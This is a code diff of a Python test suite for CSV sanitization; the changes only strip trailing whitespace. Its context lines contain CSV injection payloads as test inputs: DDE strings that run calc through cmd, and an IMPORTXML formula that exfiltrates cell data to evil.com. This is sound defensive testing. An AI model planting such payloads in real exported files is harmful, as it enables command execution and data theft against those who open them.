@@ -58,7 +58,7 @@ class TestCSVSanitization:
             "normal": "Text",
         }
         result = sanitize_csv_row(row)
-        
+
         assert result["name"] == "Alice"
         assert result["formula"] == "'=1+1"
         assert result["amount"] == "'+100"
@@ -68,7 +68,7 @@ class TestCSVSanitization:
         """None values in row become empty strings."""
         row = {"name": "Alice", "empty": None}
         result = sanitize_csv_row(row)
-        
+
         assert result["name"] == "Alice"
         assert result["empty"] == ""
 
@@ -76,12 +76,12 @@ class TestCSVSanitization:
         """Test against known CSV injection payloads."""
         # Windows Calculator
         assert sanitize_csv_value("=cmd|'/c calc'!A1").startswith("'")
-        
+
         # Data exfiltration
         assert sanitize_csv_value("=IMPORTXML(CONCAT(\"http://evil.com/?\",A1:A10),\"//\")").startswith("'")
-        
+
         # DDE attack
         assert sanitize_csv_value("=2+5+cmd|'/c calc'!A1").startswith("'")
-        
+
         # Batch file execution
         assert sanitize_csv_value("@echo off | calc").startswith("'")
